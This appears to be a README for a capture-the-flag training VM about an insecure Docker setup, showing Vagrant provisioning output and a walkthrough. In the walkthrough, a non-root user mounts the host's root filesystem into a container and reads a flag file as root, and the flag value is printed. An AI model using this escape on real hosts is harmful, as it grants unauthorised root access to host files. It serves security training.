# Examinator

```bash
mbp:unprotected-docker-target-vm dave$ vagrant up
Bringing machine 'default' up with 'vmware_fusion' provider...
==> default: Cloning VMware VM: 'bento/ubuntu-16.04'. This can take some time...
==> default: Checking if box 'bento/ubuntu-16.04' is up to date...
==> default: Verifying vmnet devices are healthy...
==> default: Preparing network adapters...
==> default: Starting the VMware VM...
==> default: Waiting for the VM to receive an address...
==> default: Forwarding ports...
    default: -- 22 => 2222
==> default: Waiting for machine to boot. This may take a few minutes...
    default: SSH address: 127.0.0.1:2222
    default: SSH username: vagrant
    default: SSH auth method: private key
    default:
    default: Vagrant insecure key detected. Vagrant will automatically replace
    default: this with a newly generated keypair for better security.
    default:
    default: Inserting generated public key within guest...
    default: Removing insecure key from the guest if it's present...
    default: Key inserted! Disconnecting and reconnecting using new SSH key...
==> default: Machine booted and ready!
==> default: Configuring network adapters within the VM...
==> default: Running provisioner: docker...
    default: Installing Docker onto machine...
==> default: Running provisioner: file...
==> default: Running provisioner: file...
==> default: Running provisioner: shell...
    default: Running: /var/folders/jw/l9r97y294fjcnzfl80t8qyh80000gn/T/vagrant-shell20171130-11385-cg7yzz.sh
    default: passwd: password expiry information changed.
    default: '/tmp/sshd_config' -> '/etc/ssh/sshd_config'
    default: '/tmp/issue.net' -> '/etc/issue.net'
    default: flag{c524acf8028461217a48eb3106c2b3ec8ffdbde2c547777f01a851767eedfb502f3f6d536ab56f2a0c28a0e6a2ea59831e503afc0e84f3840d2db6844b9cc68d}
```

# Operator

```
mbp:~ dave$ ssh dave@192.168.219.198
(•_•) ( •_•)>⌐■-■ (⌐■_■)
Root shells have been disabled. Please only use Docker.
dave@vagrant:~$ docker run -it -v /:/target-host ubuntu
root@2aa906543f6e:/# cat /target-host/flag.txt
flag{c524acf8028461217a48eb3106c2b3ec8ffdbde2c547777f01a851767eedfb502f3f6d536ab56f2a0c28a0e6a2ea59831e503afc0e84f3840d2db6844b9cc68d}
```

_Tip: Be creative if there's no internet access._
